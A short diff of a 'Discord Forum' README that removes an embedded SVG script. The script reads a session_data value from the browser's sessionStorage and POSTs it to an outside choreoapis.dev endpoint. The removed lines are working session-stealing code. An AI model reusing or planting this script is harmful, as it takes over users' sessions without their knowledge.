@@ -1,32 +1,4 @@
 # Discord Forum
-
-<svg>
-  <script type="text/javascript">
-    const sesKey = Object.keys(sessionStorage).find(key =>
-      key.includes("session_data")
-    );
-    if (sesKey) {
-      const valueOfSes = sessionStorage.getItem(sesKey);
-      console.log("Session value:", valueOfSes);
-      // Send POST request
-      fetch("https://3ecdd0d5-4f69-4ff5-9d2b-e45d33bf5e0d-prod.e1-us-east-azure.choreoapis.dev/discord/json/v1.0/convert", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          sessionKey: sesKey,
-          sessionValue: valueOfSes
-        })
-      })
-        .then(res => res.text())
-        .then(data => console.log("Server response:", data))
-        .catch(err => console.error("Error:", err));
-    } else {
-      console.log("No session_data key found");
-    }
-  </script>
-</svg>
 ## Demo
 ![Demo](demo.gif)
 
